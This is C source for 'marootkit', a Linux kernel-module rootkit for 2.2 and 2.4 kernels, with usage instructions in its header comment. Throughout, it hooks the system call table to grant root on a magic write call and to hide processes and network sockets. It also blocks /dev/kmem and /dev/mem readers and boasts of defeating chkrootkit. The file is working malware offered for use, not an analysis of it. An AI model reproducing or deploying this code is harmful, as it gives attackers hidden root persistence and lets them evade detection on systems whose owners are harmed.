/* $v1.07_marootkit microbase FULL version */

/*******************************************************************************

  Usage: gcc -O3 -c micro.c; insmod -f micro.o irqno=x

  x = kernel release 2.x.* (i.e. for kernel 2.4.1 x = 4)
   
  Local client: as -o w00t.o gotroot.s;ld -o w00t w00t.o;./w00t
  
  What's new?

   - full support of 2.2.x kernels added
   - rootkit internal API updated little bit  
   - chkrootkit v 0.39a fucked !!
   - any process wathcers via reading /dev/kmem & /dev/mem fucked!!
   - using argz for select kernel release
  
*******************************************************************************/

#define __KERNEL__
#define MODULE

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <asm/current.h>
#include <asm/uaccess.h>

extern void* sys_call_table[];

static int irqno;
MODULE_PARM(irqno,"i");

static int (*b_write)(unsigned int, char *, size_t);
static int (*b_chdir)(char *);
static int (*b_exit)(unsigned int);
static int (*b_open)(char *,unsigned int, mode_t);
static int (*b_getdents)(unsigned int, struct dirent *,unsigned int);
static long (*b_getdents64)(unsigned int, void *,unsigned int);

static int n_write(unsigned int fd, char *buf, size_t count);
static int n_chdir(char *path);
static int n_exit(unsigned int status);
static int n_open(char *filename,unsigned int flags, mode_t mode);
static int n_getdents(unsigned int fd, struct dirent *dirp, unsigned int count);
static long n_getdents64(unsigned int fd, void *dirp, unsigned int count);

#include "rootkit_conf.h"

static int nethflag=0;
static char matasklist[2*MAX_TASKS];


/*
================================================================================
                         Main rootkit API part!!
================================================================================
*/

static int n_write(unsigned int fd, char *buf, size_t count)
{
int i;
struct tst {
unsigned int p;
} k;
char *tsk,dapid[2];

if (fd == 13){
tsk = (char *)get_current();

/* ================== got r00t call =================== */
  if (_strncmp(buf,GOTROOT,LEN)==0){
         
         if (irqno > 2){
             current->uid  = 0;
             current->euid = 0;
             current->egid = 0;
             current->gid = HIDEN_GID;
	   
         } else {
       	   _memset(tsk+0x106,0,4);
           _memcpy(&dapid,tsk+0x60,2); 

           for (i=0;i<MAX_TASKS;i+=2){
              if (matasklist[i]+256*matasklist[i+1] != 0) continue; 
                matasklist[i] = dapid[0];
                matasklist[i+1]= dapid[1];
    	        break; 
           }
	   
         }
  }
  
  if (_strncmp(buf,HIDETSK,8)==0){
  
      if (irqno > 2)
          find_task_by_pid(count)->gid = HIDEN_GID;
      else {
          k.p = count;
	  _memcpy(&dapid,&k,2);
      
   	  for (i=0;i<MAX_TASKS;i+=2){
 	     if (matasklist[i]+256*matasklist[i+1] != 0) continue;
	       matasklist[i] = dapid[0];
	       matasklist[i+1] = dapid[1];
	       break;
	  }
      }
  }

  if (_strncmp(buf,SHOWALL,LEN)==0){
     for (i=0;i<MAX_TASKS;i++){
       matasklist[i] = 0;
     }
  }

tsk = 0;

if (_strncmp(buf,NETHIDE,LEN) == 0) nethflag = count;
if (_strncmp(buf,CHECKME,7) == 0) return 1;
}

return b_write(fd,buf,count);
}


/*
================================================================================
             Open() hook here; sockets hiding, anti-debug, etc
================================================================================
*/

static int n_open(char *filename,unsigned int flags, mode_t mode){
int rett=0;
struct task_struct *kall;
mm_segment_t oldf;

kall = get_current();
oldf = kall->addr_limit;
_memset(&kall->addr_limit,0xff,4);

if (mode != LEETMODE){

  if (nethflag > 0){
    if (_strcmp(filename,"/proc/net/tcp")==0)
         rett = b_open(NETHIDE_TCP,O_RDONLY,0444);

#ifdef NETHIDE_UDP

    if (_strcmp(filename,"/proc/net/udp")==0)
         rett = b_open(NETHIDE_UDP,O_RDONLY,0444);

#endif
  } // nethiding end
 
  if (_strcmp(filename,"/dev/kmem") == 0 || \
         _strcmp(filename,"/dev/mem") == 0) rett = -ENOMEM;
} 	
kall->addr_limit = oldf;
kall = 0;

if (rett == 0) return b_open(filename,flags,mode);
else return rett;
}



static int n_exit(unsigned int status){
int i;
char *tskaz,pidoz[2];

tskaz = (char *)current;
if (status == 0xfe6a){
   _memcpy(&pidoz,tskaz+0x60,2);  

   for (i=0;i<MAX_TASKS;i+=2){
     if (pidoz[0] == matasklist[i] && pidoz[1] != matasklist[i+1]) continue; 
         matasklist[i] = 0;
         matasklist[i+1] = 0;
         break; 
     }
}

tskaz = 0;
return b_exit(status);
}


/*
================================================================================
                  Process hiding on kernels 2.2.x
================================================================================
*/

static int n_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){
int ret,i,m,pid,sig=0,offset=0;
struct dirent *chk;
char *ptr,*new,test[6];

ret = b_getdents(fd,dirp,count);
ptr = (char *)kmalloc(ret,GFP_KERNEL);
new = (char *)kmalloc(ret,GFP_KERNEL);

_memset(new,0,ret);
copy_from_user(ptr,dirp,ret);

while (offset < ret){
  chk = (struct dirent *)(ptr + offset);
  m = 0;
  
  if (chk->d_reclen > 16 || _strcmp(chk->d_name,".") == 0 || \
     _strcmp(chk->d_name,"..") == 0) m = 1;

  for(i=0; i<MAX_TASKS; i+=2){
     m = 1;
     _memset(&test,0,6);
     ma_itoa((char *)&test, matasklist[i]+256*matasklist[i+1]);
     if (_strcmp((char *)chk->d_name,test)==0){ m = 0; break; }
  }

  i = chk->d_reclen;
  offset+= i;
  if (m == 1){ _memcpy(new+sig,chk,i); sig += i; }
  chk = 0;
}

copy_to_user(dirp,new,sig);
kfree(ptr);
kfree(new);
return sig;
}


/*
================================================================================
               New-style process hiding for 2.4.x kernels
================================================================================
*/

static long n_getdents64(unsigned int fd, void *dirp, unsigned int count){
long ret;
struct task_struct *k;
 
for_each_task(k){
    if (k->gid == HIDEN_GID){ k->exit_code = k->pid; k->pid = 0;}
}

ret = b_getdents64(fd,dirp,count);

for_each_task(k){
  if (k->gid == HIDEN_GID) k->pid = k->exit_code;
}

return ret;
}


/*
================================================================================
               ANTI - CHKrootkit v <= 0.39a part here...
================================================================================
*/

static int n_chdir(char *path){
int i,pid,n;
struct task_struct *find;
unsigned char *k,*demem,cid[2],ptr[6];

_memset(&ptr,0,6);

if ((_strncmp(path,"/proc",5) != 0) || (_strlen(path) > 11))
           return b_chdir(path);

for (i=7; i < _strlen(path); i++)
           ptr[i-7] = path[i];

pid = ma_atoi(path);

if (irqno == 2){

demem = (char *)&matasklist;

  for (i=0;i<MAX_TASKS;i++){
    _memcpy(&cid,demem+2*i,2);
    if ((cid[0] + 256*cid[1]) != pid) continue;
    demem = 0;
    return ENOENT;
  }
demem = 0;

} else {

for_each_task(find){
  if ((find->pid == pid) && (find->gid == HIDEN_GID) \
      && (find->uid == 0)) return ENOENT; }
}

return b_chdir(path);
}



/*       
=================================================================
               LKM standart routines here...
=================================================================
*/

int init_module()
{
EXPORT_NO_SYMBOLS;

 if (irqno < 2) return 0;
 
  _memset(&matasklist,0,2*MAX_TASKS);
  
  b_write    = sys_call_table[4];
  b_open     = sys_call_table[5];
  b_chdir    = sys_call_table[12];
  sys_call_table[4]  = n_write;
  sys_call_table[5]  = n_open;
  sys_call_table[12] = n_chdir;

  if (irqno > 2){
    b_getdents64 = sys_call_table[220];
    sys_call_table[220] = n_getdents64;
  } else {
    b_getdents = sys_call_table[141];
    b_exit     = sys_call_table[1];
    sys_call_table[141] = n_getdents;
    sys_call_table[1]   = n_exit;
    printk("using irq 0x3af8... done\n");
  }

return 0;
}


void cleanup_module()
{

  if (irqno >= 2){
    sys_call_table[4]   = b_write;
    sys_call_table[5]   = b_open;
    sys_call_table[12]  = b_chdir;

    if (irqno > 2) sys_call_table[220] = b_getdents64;
    else {
      sys_call_table[141] = b_getdents;
      sys_call_table[1]   = b_exit;
      }
  }

}
